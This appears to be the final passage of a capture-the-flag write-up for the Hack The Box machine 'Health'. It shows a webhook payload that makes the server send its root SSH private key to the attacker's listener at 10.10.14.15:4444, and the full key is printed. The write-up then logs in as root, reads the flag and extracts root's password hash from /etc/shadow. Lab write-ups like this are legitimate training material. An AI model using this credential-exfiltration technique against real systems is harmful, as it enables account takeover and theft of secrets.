{"webhookUrl":"http:\/\/10.10.14.15:4444","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}

```

Here is the key:
```console
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
-----END RSA PRIVATE KEY-----
```

Now, let's use it to log in:
```console
┌─[evyatar@parrot]─[/hackthebox/Health]
└──╼ $ ssh -i id_rsa2 root@health.htb
load pubkey "id_rsa2": invalid format
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 24 13:47:54 UTC 2022

  System load:  0.08              Processes:           181
  Usage of /:   66.4% of 3.84GB   Users logged in:     1
  Memory usage: 15%               IP address for eth0: 10.10.11.176
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@health:~# cat root.txt
d87174d8f080957dc7f5693d717b92fb
```

PDF password:
```console
root@health:~# cat /etc/shadow | grep root | cut -d':' -f2
$6$CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn/
```